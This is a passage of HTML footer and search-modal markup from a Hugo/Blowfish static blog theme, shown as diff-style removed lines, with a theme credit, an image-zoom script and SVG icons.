-    </p>
-<p class="text-xs text-neutral-500 dark:text-neutral-400">
-      
-      
-      由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://blowfish.page/" rel="noopener noreferrer" target="_blank">Blowfish</a> 强力驱动
-    </p>
-</div>
-<script>
-    
-    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
-      margin: 24,
-      background: 'rgba(0,0,0,0.5)',
-      scrollOffset: 0,
-    })
-    
-  </script>
-<script integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ==" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" type="text/javascript"></script>
-</footer><div class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url="https://ta0lve.github.io/" id="search-wrapper" style="z-index:500">
-<div class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800" id="search-modal">
-<header class="relative z-10 flex items-center justify-between flex-none px-2">
-<form class="flex items-center flex-auto min-w-0">
-<div class="flex items-center justify-center w-8 h-8 text-neutral-400">
-<span class="relative block icon">
-<svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
-</span>
-</div>
-<input class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" id="search-query" placeholder="" tabindex="0" type="search"/>
-</form>
-<button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" id="close-search-button" title="">
-<span class="relative block icon">
-<svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
-</span>
-</button>
-</header>
-<section class="flex-auto px-2 overflow-auto">
-<ul id="search-results">
-</ul>
-</section>
-</div>
-</div>
-</div>
-</body>
-</html>
